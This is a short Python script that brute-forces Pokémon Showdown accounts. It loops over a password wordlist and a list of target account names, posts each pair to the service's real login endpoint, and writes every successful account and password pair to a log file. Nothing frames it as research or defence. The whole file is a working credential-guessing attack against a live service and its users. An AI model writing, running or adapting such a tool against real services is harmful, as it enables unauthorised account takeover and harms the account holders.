'''
Created on Oct 6, 2015

@author: Zeppo
'''

import os
import config
import inspect
import requests
from re import findall
from linecache import getline


def login(account, passwd):
    """Takes an account name and password
    as arguments and returns true
    if the login is successful
    otherwise returns []"""
    request = requests.post("http://play.pokemonshowdown.com/~~showdown/action.php",
                            data={'act': "login",
                                  'name': account,
                                  'pass': passwd,
                                  'challengekeyid': '3',
                                  'challenge': ""})

    return findall("\"loggedin\":true", str(request.text))


def run_crack():
    """Takes an account name and dictionary
    as arguments and attempts to brute force
    the account given account by with the dictionary"""
    TRYS = 0
    with open(config.targets) as targets:
        targets = [target for target in targets]
    with open('C:\\Users\\Zeppo\\Documents\\GitHub\\coroutines-demo\\passwds.txt') as passwds:
        passwds = [passwd.rstrip() for passwd in passwds]
    
    for passwd in passwds:
        for account in targets:
            try:
                if login(account, passwd):
                    with open(config.logs, 'a') as logs:
                        logs.write(account+": "+passwd+'\n')
                        os.startfile(config.logs)
                else:
                    TRYS += 1
                    print(str(TRYS)+'\n'+account+': ' + passwd)
            except:
                pass


